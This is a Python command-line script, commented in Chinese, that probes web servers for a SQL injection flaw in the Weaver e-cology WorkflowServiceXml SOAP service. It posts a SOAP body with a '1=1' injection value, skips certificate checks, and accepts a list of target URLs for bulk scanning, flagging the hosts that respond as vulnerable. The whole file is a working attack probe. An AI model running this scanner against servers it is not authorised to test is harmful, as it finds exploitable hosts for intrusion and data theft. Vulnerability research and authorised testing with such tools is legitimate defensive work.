#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_sql_injection(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Content-Type': 'text/xml',
        'Accept-Encoding': 'gzip'
    }

    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
                <soapenv:Header/>
                <soapenv:Body>
                    <web:getHendledWorkflowRequestList>
                        <web:in0>1</web:in0>
                        <web:in1>1</web:in1>
                        <web:in2>1</web:in2>
                        <web:in3>1</web:in3>
                        <web:in4>
                            <web:string>1=1</web:string>
                        </web:in4>
                    </web:getHendledWorkflowRequestList>
                </soapenv:Body>
              </soapenv:Envelope>'''

    try:
        response = requests.post(f"{url.rstrip('/')}/services/WorkflowServiceXml", headers=headers, data=data, verify=False, timeout=30)
        if response.status_code == 200 and "WorkflowRequestInfo" in response.text:
            print(f"{RED}URL [{url}] 存在泛微e-cology WorkflowServiceXml SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在泛微e-cology WorkflowServiceXml SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_sql_injection(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_sql_injection(url)

if __name__ == '__main__':
    main()
